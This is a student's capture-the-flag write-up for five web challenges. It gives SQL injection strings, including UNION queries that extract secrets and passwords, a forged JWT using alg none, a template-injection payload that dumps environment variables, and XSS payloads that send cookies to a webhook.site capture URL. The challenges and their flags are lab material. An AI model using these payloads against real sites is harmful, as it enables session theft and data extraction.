# 1. databaseincursionv2

## Solution:
```
-  ' OR '1'='1' -- 
-  ' OR department='Management' -- 
-  Kiwi' AND department='Management' -- 
-  ' UNION SELECT * FROM metadata -- 
-  ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 -- 
```


## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- Learnt more about SQL and SQLi

## Resources:

- Took hints for doing this, got to know that union should be used.
- https://portswigger.net/web-security/sql-injection/union-attacks


# 2. temporal token

## Solution:

- First I inspected the page to look at the cookies. I figured out that there is no token called cookie. So I added a token cookie with a value token and reloaded the page.
- When i tried to log in, it said valid credentials but still didnt let me in the site.
- When i looked at the value of the token cookie i added it changed to a jwt encoded line
- I used jwt.io to get the header, payload, signature of that encoded line
- After a lot of inspection, i figured out that its a symmetric key algorithm, and it has exp: 0 which makes it expired instantly.
- I then changed that existing jwt : Alg- none and exp: 9999999999
- When i used this exact value in the page it gave me the flag.

## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts Learnt:
- How payloads,headers work in websites.
- How to bypass these.

## Resources:
- https://www.jwt.io/introduction#what-is-json-web-token

# 3. Oneshot

## Solution: 
- When I opened the site I saw that we only get one chance to run a query + guess the password.
- Noticed that every new session gets a completely new table id, so queries from previous sessions won’t work.
- I tried different queries and finally used this one to leak 1 character at a time:

```
' AND 0 UNION ALL SELECT substr(password,1,1) FROM table_9f3c1ab774e528d0
' AND 0 
UNION ALL SELECT substr(password,1,1) FROM table_9f3c1ab774e528d0 
UNION ALL SELECT substr(password,2,1) FROM table_9f3c1ab774e528d0 
UNION ALL SELECT substr(password,32,1) FROM table_9f3c1ab774e528d0 --
```

- Showed output in jumbled form which after gave me the flag

# Flag:
```
nite{are_you_feeling_the_heat_now:)}
```

## Concepts Learned:
- SQL Injection (UNION based + substring extraction)

## Resources:
- Chatgpt carried me throughout the whole thing.

# 4. sweethaven
- The website will be accessible at http://localhost:1234
- After solving locally, access the challenge server at http://sweethaven.nitephase.live:57889

## Solution:
- Since every kind of these challenges we have done it first locally and then connected to remote server i knew what had to be done.
- Kind of understood that sql needs to be used.
- The app.py has .decode("unicode_escape") which blocks injections wih $
- So i tried \N{DOLLAR SIGN}{7*7} which gave me 49 meaning SQL is nw working.


```
\N{DOLLAR SIGN}{cycler._init.globals_.os.environ}
```

- When used in remote server gave me the flag.

## Flag:
```
nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
```

## Concepts learnt:
- Injection using Unicode char

## Resources:
- https://hackviser.com/tactics/pentesting/web/sql-injection

# 5. Why is it not called css
- The website will be accessible at http://localhost:56743
- After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

## Solution:
- In app.py I explored what each command is doing, and figured out that three parts exists XSS1,XSS2,XSS3
- I figured out that webhook.site is used to capture the cookies captured by the bot when injections are passed through
- After pasting the later part of the cookie in the url of the website it loaded XSS2 
- And then after getting cookie of XSS3 i put it in the url and got XSS3 web page.

```
<script>window.location='h< >/?cookie='+document.cookie</script>
<scrscriptipt>window.location='https://webhook.site/9f3b27c4-1a8d-49e6-9342-52be7d8ce7aa?cookie='+document.cookie</scrscriptipt>
<body onload="window.location='https://webhook.site/9f3b27c4-1a8d-49e6-9342-52be7d8ce7aa?c='+window['doc'+'ument']['coo'+'kie']">
```

- This is how i got the flag.   

## Flag:
```
nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
```
## Concepts learned:
- XSS scrypting

## Resources:
- Chatgpt

    
